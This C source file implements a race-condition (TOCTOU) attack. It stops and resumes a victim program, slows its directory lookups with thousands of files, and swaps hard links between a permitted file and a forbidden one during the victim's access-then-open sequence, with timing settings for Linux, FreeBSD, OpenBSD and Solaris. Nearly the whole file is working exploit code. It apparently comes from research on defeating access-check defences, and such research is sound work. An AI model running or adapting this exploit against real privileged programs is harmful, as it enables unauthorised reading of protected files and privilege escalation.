#include <assert.h>
#include <fcntl.h>
#include <pthread.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ipc.h>
#include <sys/param.h>
#include <sys/resource.h>
#include <sys/sem.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include <sched.h>
#include "actionlog.h"

/*****************
 * Logs
 *****************/
 
char attacker_logbuf[1<<20];
log *attacker_log = (log *)&attacker_logbuf;

log *child_log;

log *victim_log;

void update_log_output(void)
{
  static unsigned long long last_dump = 0;
  char combined_logbuf1[1<<19];
  char combined_logbuf2[1<<19];
  log *combined_log;

  combined_log = attacker_log;

  if(child_log){
    init_log((log *)combined_logbuf1);
    merge_logs(attacker_log, child_log, (log*)combined_logbuf1);
    combined_log = (log *)combined_logbuf1;
  }
  if (victim_log) {
    init_log((log *)combined_logbuf2);
    merge_logs(combined_log, victim_log, (log*)combined_logbuf2);
    combined_log= (log *)combined_logbuf2;
  }

  last_dump = dump_log_since(combined_log, last_dump);
}

/******************
 * Filenames
 ******************/

char *slowfile;
char *filenames[1<<25];
char *fnames1[1<<25];
char *fnames2[1<<25];
int nfilenames;
int nfnames;

void load_filenames(char *namelistfile, char *listfile)
{
  FILE *f;
  FILE *g;
	
  if ((f = fopen(namelistfile, "r")) == NULL) {
    perror("Couldn't open filename list file");
    exit(1);
  }
  if ((g = fopen(listfile, "r")) == NULL) {
    perror("Couldn't open listfile");
    exit(1);
  }

  slowfile=(char *)malloc(260*sizeof(char));
  fgets(slowfile,260,f);
  
  nfilenames = nfnames = 0;
  
  filenames[nfilenames]=(char *)malloc(260*sizeof(char));
  fnames1[nfnames]=(char *)malloc(260*sizeof(char));
  fnames2[nfnames]=(char *)malloc(260*sizeof(char));
  
  while(fgets(filenames[nfilenames],260,f) != NULL){
    nfilenames++;
    filenames[nfilenames]=(char *)malloc(260*sizeof(char));
  }
  while(fgets(fnames1[nfnames],260,g) != NULL){
    strcpy(fnames2[nfnames], fnames1[nfnames]);
    nfnames++;
    fnames1[nfnames]=(char *)malloc(260*sizeof(char));
    fnames2[nfnames]=(char *)malloc(260*sizeof(char));
  }
  
  fclose(f);
  fclose(g);
}

/*********************
 * Timing
 *********************/

long long tv2usecs(struct timeval *tv)
{
  return tv->tv_sec * 1000000ULL + tv->tv_usec;
}

long long nowusecs(void)
{
  struct timeval tv;
  gettimeofday(&tv, NULL);
  return tv2usecs (&tv);
}

unsigned long long measure_lstat_time(char *filename)
{
  int i;
  unsigned long long x1, x2;
  struct stat dummy;
  unsigned long long mintime = 100000000000ULL;

  for (i = 0; i < 100; i++) {
    x1=nowusecs();
    lstat(filename, &dummy);
    x2=nowusecs();  
    if (x2 - x1 < mintime)
      mintime = x2 - x1;
  }
  return mintime;
}

void log_lstat_time(char *filename)
{
  logprintf(attacker_log, "A: lstat(slowfile) costs %lld", measure_lstat_time(filename));
}

int cmpint(const void *a, const void *b)
{
  int *ai = (int *)a, *bi = (int *)b;
  return *ai - *bi;
}

/* Returns a time, in usecs, such that, with "high" probability,
   a call to nanosleep with the given timespec will sleep for
   that amount of time or less. */
unsigned long long measure_nanosleep_time(struct timespec *req)
{
  int i;
  unsigned long long x1, x2;
  int times[200];

  for (i = 0; i < 200; i++) {
    x1 = nowusecs();
    nanosleep(req, NULL);
    x2 = nowusecs();
    times[i] = x2 - x1;
  }
  qsort(times, 200, sizeof(times[0]), &cmpint);
  logprintf(attacker_log, "A: Median nanosleep time: %d", times[100]);
  update_log_output();
  return times[195];
}

/* Determine nfiles from sleep_time.  As a side-effect, this sets up
   slowfile to be slow, so this can substitute for firstswitchto(). */
int measure_nfiles(char *slowfile, char **filenames, char *tgt, 
		   int sleep_time)
{
  int nfiles;
  int i;
  int lst;

  if (link(tgt, slowfile)) {
    perror("Couldn't link slowfile to tgt");
    exit(1);
  }

  nfiles = 1;
  unlink(filenames[0]);
  lst = measure_lstat_time(slowfile);

  while (lst < sleep_time ) {
    logprintf(attacker_log, "A: measure: nfiles: %d, lstat time: %d, new nfiles: %d", 
	   nfiles, lst, sleep_time * nfiles / lst);
    update_log_output();
    for (i = nfiles; i < sleep_time * nfiles / lst; i++)
      unlink(filenames[i]);
    if (nfiles < sleep_time * nfiles / lst)
      nfiles = sleep_time * nfiles / lst;
    else
      break;
    lst = measure_lstat_time(slowfile);
  }

  return nfiles;
}

/***********************
 * Switching functions
 ***********************/

void firstswitchto_openbsd (char *slowfile, char **filenames, int nfiles, char *tgt)
{
  int i;
  struct stat buff;

  logprintf(attacker_log, "A: setting up files...", nowusecs());
  update_log_output(); 

  for (i = nfiles - 1; i >= 0; i--){
    if (close(open(filenames[i], O_CREAT, S_IRWXU))) {
      perror("1 Couldn't create link");
      exit(1);
    }
    lstat(filenames[i],&buff);
  }

  link(tgt, slowfile);
  close(open(slowfile,O_RDONLY));
  lstat(slowfile, &buff);
  lstat(filenames[nfiles-1], &buff);

  if(chdir("/tmp/attack2")){
    perror("chdir2");
    exit(1);
  }
  for (i = nfiles - 1; i >= 0; i--){
    link("/tmp/public", fnames1[i]);
    lstat(fnames1[i],&buff);
  }
  lstat(fnames1[nfiles-1],&buff);

  if(chdir("/tmp/attack3")){
    perror("chdir3");
    exit(1);
  }
  for (i = nfiles - 1; i >= 0; i--){
    link("/tmp/secret", fnames2[i]);
    lstat(fnames2[i],&buff);
  }
  lstat(fnames2[nfiles-1],&buff);

  logprintf(attacker_log, "A: done", nowusecs());
  update_log_output();
}

void firstswitchto (char *slowfile, char **filenames, int nfiles, char *tgt)
{
  int i;
  struct stat buff;

  logprintf(attacker_log, "A: setting up files...", nowusecs());
  update_log_output(); 

  link(tgt, slowfile);
  close(open(slowfile,O_RDONLY));
  lstat(slowfile,&buff); 

  for (i = nfiles - 1; i >= 0; i--){
    if (close(open(filenames[i], O_CREAT, S_IRWXU))) {
      perror("1 Couldn't create link");
      exit(1);
    }
    lstat(filenames[i],&buff);
  }

  logprintf(attacker_log, "A: done", nowusecs());
  update_log_output();
}

void switchto(char *slowfile, char **filenames, int nfiles, char *tgt)
{
  int n;
  struct stat buff;
  unlink(slowfile);
		
  if (link(tgt, slowfile)) {
    perror("2 Couldn't create link");
    exit(1);
  }
  lstat(slowfile,&buff);

  for(n=nfiles-1;n>=0;n--){
    unlink(filenames[n]);
    if (close(open(filenames[n], O_CREAT, S_IRWXU))) {
      perror("3 Couldn't create link");
      exit(1);
    }
    lstat(filenames[n],&buff);
  }
}

void switchto_and_make_slow(char *slowfile, char **filenames, int nfiles, char *tgt)
{
  int i;
  unlink(slowfile);
  link(tgt, slowfile);

  for (i = 0; i != nfiles - 1; i ++) {
       rename(filenames[i], "test");
       rename("test",filenames[i]);
  }
}

void quickswitch(char *slowfile, char **filenames, int nfiles, char *tgt)
{
  unlink(slowfile);
  link(tgt,slowfile);
}

void switchto_openbsd(char *slowfile, char **filenames, int nfiles, char *tgt, int count)
{
  struct stat buff;
  char old[1000];
  char new[1000];
/* 
  logprintf(attacker_log, "A: before unlink");
  unlink(slowfile);
		
  logprintf(attacker_log, "A: before link");
  if (link(tgt, slowfile)) {
    perror("4 Couldn't create link");
    exit(1);
  }
*/
  strcat(old, "/tmp/attack/");
  strcat(old,slowfile);
  logprintf(attacker_log, "A: before rename");
  if(strcmp("/tmp/public", tgt) == 0){
	  strcat(new, "/tmp/attack2/");
	  strcat(new, fnames1[count]);
  }
  if(strcmp("/tmp/secret", tgt) == 0){
	  strcat(new, "/tmp/attack3/");
	  strcat(new, fnames2[count]);
  }
  rename(old, new);

  logprintf(attacker_log, "A: before lstat");
  lstat(filenames[nfiles-1],&buff);
}


typedef void (*switchfunc_t)(char *slowfile, char **filenames, int nfiles, char *tgt);

void fork_switchto(switchfunc_t switchfunc,
		   char *slowfile, char **filenames, int nfiles, char *tgt)
{
  int chpid, status;

  chpid=fork();
  if(chpid==0){
    switchfunc(slowfile, filenames, nfiles, tgt);
    exit(0);
  } else if (chpid == -1) {
    perror("1 Couldn't fork");
    exit(1);
  } else {
    unsigned long long t = nowusecs();
    waitpid(chpid, &status, WUNTRACED | WCONTINUED);
    t = nowusecs() - t;
    logprintf(attacker_log, "A: switching time: %5lld seconds", t / 1000000);
  }
}

/*********************
 * Sleepwalk trickery
 *********************/

void busywait(int musecs)
{
  long long start;
  long long now;

  if (musecs == 0)
    return;

  start = nowusecs();
  do {
    now = nowusecs();
  } while (now - start < musecs);
}

int *child_int; /* used for synchronization */

int sleep_walk(struct timespec *rqtp, int busywait_musecs,
		void (*func)(void *arg), void *arg)
{
  int chpid;
  long long x1;

  *child_int = 0;

  chpid=fork();
  if (chpid == 0) {
	
    while (*child_int == 0)
      ;

    func(arg);

    exit(0);
  }
  else if (chpid == -1) {
    perror("2 Couldn't fork");
    exit(1);
  }

  if(0 != nanosleep(rqtp, NULL))
 	perror("2 cannot nanosleep!!!");	
  busywait(busywait_musecs);

  *child_int = 1;

  x1 = nowusecs();
  logprintf(attacker_log, "A: before nanosleep");
  if(0 != nanosleep(rqtp, NULL))
  	perror("2 cannot nanosleep!!!");	
  logprintf(attacker_log, "A: after nanosleep (sleep duration: %lld)", nowusecs() - x1);

  return chpid;
}

/*********************************
 * Victim management functons
 *********************************/

void start_victim(void *args)
{
  char **victim_args = (char **)args;
  nice(100);
  execvp(victim_args[0], victim_args);
  perror("execvp");
}

void continue_victim(void *victimpid)
{
  int * vp = (int *) victimpid;
  if (kill(*vp, SIGCONT)) {
    perror("Couldn't continue victim");
    exit(0);
  }
  logprintf(child_log, "A: CONTED");	
}

/**************************
 * One step of the attack
 **************************/

struct step {
  void (*switchfunc)(char *slowfile, char **filenames, int nfiles, char *tgt);
  int fork_switch;
  int log_lstat_time;
  int stop_victim;
  int busywait_musecs;
  struct timespec orqtp;
  int cont_victim;
  int sleep_walk;
};

int victim_status;

void do_one_step(int victimpid, int step, 
		 char *slowfile, char **filenames, int nfiles, char *tgt,
		 struct step *conf, int count)
{ 

  unsigned long long x1; 
  /***** STOP the victim *****/
  if(conf->stop_victim && victimpid) {
    if (kill(victimpid, SIGSTOP)) {
      perror("Couldn't stop victim");
      exit(1);
    }

    logprintf(attacker_log, "A: STOPPED %d", step);
  }  
  
  if (conf->cont_victim)
    update_log_output();

  /***** SWITCH the file ******/
  if (conf->fork_switch)
    fork_switchto(conf->switchfunc, slowfile, filenames, nfiles, tgt);
  else {
    logprintf(attacker_log, "A: before sw (one step)");
    conf->switchfunc(slowfile, filenames, nfiles, tgt, count);
    logprintf(attacker_log, "A: after  sw (one step)");
  }
  if (conf->log_lstat_time)
    log_lstat_time(slowfile);

  if (waitpid(victimpid, &victim_status,  WNOHANG) == victimpid){
    logprintf(attacker_log, "A: vic ends");
    exit(0);
  }

    x1 = nowusecs();
    logprintf(attacker_log, "A: before nanosleep (one step)");
    if(0 != nanosleep(&conf->orqtp, NULL))
      perror("3 cannot nanosleep!!!");
    logprintf(attacker_log, "A: after nanosleep (sleep duration: %lld)", nowusecs() - x1);
  
  /***** CONTinue the victim *****/
  if (conf->cont_victim) {
    update_log_output();
    if (conf->sleep_walk)
      sleep_walk(&conf->orqtp, conf->busywait_musecs, continue_victim, &victimpid);
    else {
      long long x1;
 /*     if(0 != nanosleep(&conf->orqtp, NULL))
		perror("0 cannot nanosleep!!!");	
	  if(0 != nanosleep(&conf->orqtp, NULL))
		perror("0 cannot nanosleep!!!");*/
      continue_victim(&victimpid);
      x1 = nowusecs();
      logprintf(attacker_log, "A: before nanosleep (non-sleepwalk mode)");
      if(0 != nanosleep(&conf->orqtp, NULL))
		perror("2 cannot nanosleep!!!");	
      logprintf(attacker_log, "A: after nanosleep (sleep duration: %lld)", nowusecs() - x1);
    }
  }
}

/********************
 * OS-specific stuff
 ********************/

typedef struct os_config {
  char *name;
  struct timespec irqtp;
  int init_busywait_musecs;
  struct step steps[4];
} os_config;

os_config os_configs[5] =
  {
    { "openbsd",   { 0, 0 }, 6000, 
	  /*  switching func          fork  log_lstat stop  busy    sleep time   cont sleepwalk */
      { { switchto_openbsd,            0,    0,        0,      0,     {0, 0 },    0,      0 },
	{ switchto_openbsd,            0,    0,        0,      0,     {0, 0 },    0,      0 },
	{ switchto_openbsd,            0,    0,        0,      0,     {0, 0 },    0,      0 },
	{ NULL }
      }
    },
    { "openbsd2",   { 0, 0 }, 5000, 
      { { switchto_openbsd,            1,    0,        0,   7000,     {0, 0 },    0,      1 },
	{ switchto_openbsd,            1,    0,        0,   7000,     {0, 0 },    0,      1 },
	{ switchto_openbsd,            1,    0,        0,   7000,     {0, 0 },    0,      1 },
	{ NULL }
      }
    },
    { "linux",     { 0, 6500000 }, 0,
      { { switchto_and_make_slow,      1,    1,        1,      0, {0, 500000 },   1,      0 },
	{ switchto_and_make_slow,      1,    1,        1,      0, {0, 500000 },   1,      0 },
	{ switchto_and_make_slow,      1,    1,        1,      0, {0, 500000 },   1,      0 },
	{ NULL }
      }
    },
    { "freebsd",   { 0, 2000000 }, 0, 
      { { switchto,                    1,    0,        1,    0, {0, 600000 },     1,      1 },
	{ switchto,                    1,    0,        1,    0, {0, 600000 },     1,      1 },
	{ switchto,                    1,    0,        1,    0, {0, 600000 },     1,      1 },
	{ NULL }
      }
    },
    { "solaris",   { 0,  100000 }, 5000, 
      { { quickswitch,                 0,    0,        1, 5000, { 0, 100000 },    0,      1 },
	{ switchto,                    1,    0,        0, 5000, { 0, 100000 },    1,      1 },
	{ quickswitch,                 0,    0,        1, 5000, { 0, 100000 },    0,      1 },
	{ switchto,                    1,    0,        0, 5000, { 0, 100000 },    1,      1 }
      }
    }
  };

os_config *config = &os_configs[0];

/***************************************
 * A couple of process management details
 ***************************************/

pid_t victimpid = 0;
pid_t attackerpid = 0;

int shmid;

void atexit_func(void)
{
  struct shmid_ds shmds;

  if (getpid()== attackerpid) {
    logprintf(attacker_log, "A: Victim exit status: %d", victim_status);
    logprintf(attacker_log, "A: Victim exited %s", WIFEXITED(victim_status) ? "normally" : "abnormally");
    if (WIFEXITED(victim_status)) {
      logprintf(attacker_log, "A: Victim exit code: %d - %s", 
		WEXITSTATUS(victim_status),
		WEXITSTATUS(victim_status) == 0 ? "SUCCESS" : 
		WEXITSTATUS(victim_status) == 1 ? "FAILURE (wrong file)" :
		"FAILURE (attack detected)");
    } else if (WIFSIGNALED(victim_status)) {
      logprintf(attacker_log, "A: Victim terminated by signal %d", WTERMSIG(victim_status));
      logprintf(attacker_log, "A: FAILURE");
    } else {
      logprintf(attacker_log, "A: Victim exited for unknown reasons");
      logprintf(attacker_log, "A: FAILURE");
    }
    update_log_output();
    if ((shmctl(shmid, IPC_RMID, &shmds)) < 0) {
      perror("Couldn't destroy shared memory segment");
    }
  }
}

int main(int argc, char **argv)
{
  int debug;
  char *namelistfile;
  char *namelistrefile;
  char *basedir;
  int nfiles;
  char *goodfile;
  char *badfile;
  char *victim_args[argc];
  int i;
  int sleep_time;
  key_t shmkey;

  char* dummy[2];
  int chpid;
  int status;
  int count = 0;
  attackerpid = getpid();

  init_log(attacker_log);

  if (argc < 9) {
    printf("hash-attacker <OS type> <debug> <namelist> <basedir> <nfiles> <goodfile> <badfile> <victim> <victim args>\n"
	   "OS type:     linux or freebsd or openbsd or solaris\n"
	   "debug:       0 = no debugging, 1 = debugging\n"
	   "namelist:    name of file containing list of filenames to use\n"
	   "basedir:     attack files will be created in this directory\n"
	   "nfiles:      number of files to be used in attacks\n"
	   "goodfile:    the file you are allowed to access\n"
	   "badfile:     the file you want to access\n"
	   "victim:      victim executable\n"
	   "\n"
	   "Note: victim will be executed a \"victim victim_args path\n"
	   "Note: goodfile, badfile, victim, and victim's arguments\n"
	   "      must be absolute paths or relative to basedir.\n");
		
    exit(0);
  }

  debug = atoi(argv[2]);
  namelistfile = argv[3];
  basedir = argv[4];
  nfiles = atoi(argv[5]);
  goodfile = argv[6];
  badfile = argv[7];

  namelistrefile = "refilenames.openbsd";

  for(i= 0; i < sizeof(os_configs) / sizeof(os_configs[0]); i++)
    if(strcmp(argv[1], os_configs[i].name) == 0) {
      config = &os_configs[i];
      break;
    }

  load_filenames(namelistfile, namelistrefile);

  for (i = 0; i < argc - 8; i++)
  	victim_args[i] = argv[i + 8];
  victim_args[i++] = slowfile;
  victim_args[i++] = NULL;
	
  dummy[0] = victim_args[0];
  dummy[1] = NULL;

  if (chdir(basedir)) {
    perror("Couldn't switch to basedir");
    exit(1);
  }

  if (nfiles == 0) {
    sleep_time = measure_nanosleep_time(&config->steps[0].orqtp);
    logprintf(attacker_log, "A: Measured nanosleep time: %d", sleep_time);
    update_log_output();
    nfiles = measure_nfiles(slowfile, filenames, badfile, 3*sleep_time/2);
    logprintf(attacker_log, "A: nfiles: %d, lstat_time: %lld", 
	   nfiles, measure_lstat_time(slowfile));
    update_log_output();
  } else {
    if(strcmp(config->name, "openbsd") == 0)
      fork_switchto(firstswitchto_openbsd, slowfile, filenames, nfiles, badfile);
    else
      fork_switchto(firstswitchto, slowfile, filenames, nfiles, badfile);	
  }

  if (chdir(basedir)) {
    perror("Couldn't switch to basedir");
    exit(1);
  }

  if ((shmkey = ftok(victim_args[0], 'R')) < 0) {
    perror("Couldn't get shared memory key");
    exit(1);
  }

  if ((shmid = shmget(shmkey, 1<<20, IPC_CREAT| S_IRWXU)) < 0) {
    perror("Couldn't get shared memory identifier");
    exit(1);
  }

  if ((victim_log = (log*) shmat(shmid, NULL, 0)) == NULL) {
    perror("Cannot attach shared mem segment");
    exit(1);
  }
  init_log(victim_log);

  if ((child_log = (log*) mmap(NULL, 1<<20, PROT_READ | PROT_WRITE, 
			       MAP_ANON | MAP_SHARED, -1, 0)) == (log*)-1) {
    perror("1 Cannot create shared mem segment");
    exit(1);
  }
  init_log(child_log);

  if ((child_int = (int*) mmap(NULL, 1<<4, PROT_READ | PROT_WRITE, 
			       MAP_ANON | MAP_SHARED, -1, 0)) == (int*)-1) {
    perror("2 Cannot create shared mem segment");
    exit(1);
  }

  atexit(atexit_func);

  //sleep(30);
   
  chpid = fork();
  if(chpid == 0){
  	execvp(dummy[0],dummy);
  	perror("execvp");
	exit(0);
  }
  else if(chpid == -1){
	perror("cannot fork");
	exit(1);
  }
  else{
    waitpid(chpid, &status, WUNTRACED | WCONTINUED);
  }

  victimpid = sleep_walk(&config->irqtp, config->init_busywait_musecs,
			 start_victim, victim_args);

  while(1) {
    // VICTIM: lstat
    do_one_step(victimpid, 2, slowfile, filenames, nfiles, goodfile, &config->steps[0], count++);
    // VICTIM: access
    do_one_step(victimpid, 3, slowfile, filenames, nfiles, badfile, &config->steps[1], count++);
    // VICTIM: open
    do_one_step(victimpid, 4, slowfile, filenames, nfiles, badfile, &config->steps[2], count++);
    // VICTIM: fsat
    if (config->steps[3].switchfunc)
      do_one_step(victimpid, 5, slowfile, filenames, nfiles, badfile, &config->steps[3], count++);
    // VICTIM: [close]
  }

  return 0;
}
